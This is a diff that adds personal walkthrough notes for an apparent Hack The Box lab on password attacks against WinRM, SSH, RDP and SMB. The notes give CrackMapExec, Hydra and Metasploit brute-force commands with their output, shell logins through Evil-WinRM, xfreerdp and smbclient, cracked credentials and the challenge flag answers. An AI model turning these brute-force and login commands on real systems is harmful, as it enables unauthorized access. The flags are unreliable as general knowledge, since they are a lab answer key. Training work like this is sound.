@@ -1,1 +1,147 @@
+so basically we start with good ol footprinting to see what services are running and what we can try to tap into. 
+
+Let us imagine that we want to manage a Windows server over the network. Accordingly, we need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal. In this case, the most common services suitable for this are RDP, WinRM, and SSH. SSH is now much less common on Windows, but it is the leading service for Linux-based systems.
+
+All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.
+
+
+Starting with WinRM 
+
+for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
+
+A handy tool that we can use for our password attacks is CrackMapExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.
+
+Intall SYNTAX: 
+MJBUCKNER@htb[/htb]$ sudo apt-get -y install crackmapexec
+
+OR 
+
+use NetExec: sudo apt-get -y install netexec 
+
+Crackmap usage: 
+
+Syntax: MJBUCKNER@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist> 
+Syntax: MJBUCKNER@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
+
+WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
+WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
+WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
+
+Pwn3d! means we can execute system commands if we log in with that user. a good tool to use to do so is Evil-WinRM 
+
+to install -> 
+
+Syntax:  MJBUCKNER@htb[/htb]$ sudo gem install evil-winrm
+
+Fetching little-plugger-1.1.4.gem
+Fetching rubyntlm-0.6.3.gem
+Fetching builder-3.2.4.gem
+Fetching logging-2.3.0.gem
+Fetching gyoku-1.3.1.gem
+Fetching nori-2.6.0.gem
+Fetching gssapi-1.3.1.gem
+Fetching erubi-1.10.0.gem
+Fetching evil-winrm-3.3.gem
+Fetching winrm-2.3.6.gem
+Fetching winrm-fs-1.3.5.gem
+Happy hacking! :)
+
+Usage Syntax: 
+MJBUCKNER@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\user\Documents>
+
+using Hydra to crack ssh pass -> 
+MJBUCKNER@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
+[DATA] attacking ssh://10.129.42.197:22/
+[22][ssh] host: 10.129.42.197   login: user   password: password
+1 of 1 target successfully completed, 1 valid password found
+
+
+IF using a known user the switch is -l not -L and same with known pass its -> -p not -P 
+
+can also use Hydra for RDP brute force -> 
+
+Syntax: MJBUCKNER@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
+[DATA] attacking rdp://10.129.42.197:3389/
+[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
+[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
+[3389][rdp] host: 10.129.42.197   login: user   password: password
+1 of 1 target successfully completed, 1 valid password found
+
+
+Challenge: 10.129.226.199 *!*!*!*! ALSO use the password and username list given in resources. *!*!*!*
+
+Question 1 - Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+1) crackmapexec winrm 10.129.226.199 -u user.list -p pass.list 
+2) WINRM       10.129.226.199  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
+3) evil-winrm -i 10.129.226.199 -u john 
+enter password 
+4) enumerate to c:\Users\john\Desktop
+5) type flag.txt -> HTB{That5Novemb3r}  
+
+Question 2 - Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer. 
+1) hydra -L user.list -P pass.list ssh://10.129.226.199
+2) output: [22][ssh] host: 10.129.226.199   login: dennis   password: rockstar
+3) ssh dennis@10.129.226.199  -> enter cracked password
+4) cd c:\Users\Dennis\Desktop 
+5) type flag.txt HTB{Let5R0ck1t}
+
+
+Question 3 -  Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+1) hydra -L user.list -P pass.list rdp://10.129.226.199
+2) [3389][rdp] host: 10.129.226.199   login: chris   password: 789456123
+3) xfreerdp /v:10.129.226.199 /u:chris /p:789456123
+4) flag is right there on the desktop
+5) HTB{R3m0t3DeskIsw4yT00easy}
+
+Question 4 - Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+1) msfconsole -q 
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set PASS_FILE pass.list
+PASS_FILE => pass.list
+[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set USER_FILE user.list
+USER_FILE => user.list
+[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set RHOST 10.129.226.199
+RHOST => 10.129.226.199
+[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> 
+2) exploit 
+3) 10.129.226.199:445    - 10.129.226.199:445 - Success: '.\cassie:12345678910
+4) smbclient -U cassie -L '\\10.129.226.199\'
+Password for [WORKGROUP\cassie]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	CASSIE          Disk      
+	IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.226.199 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+5) we see from above output there is a fileshare named cassie lets dig into that 
+6) smbclient -U cassie '\\10.129.226.199\CASSIE'
+7) dir 
+8) get flag.txt 
+9) on KALI terminal -> cat flag.txt HTB{S4ndM4ndB33}
+
+
 
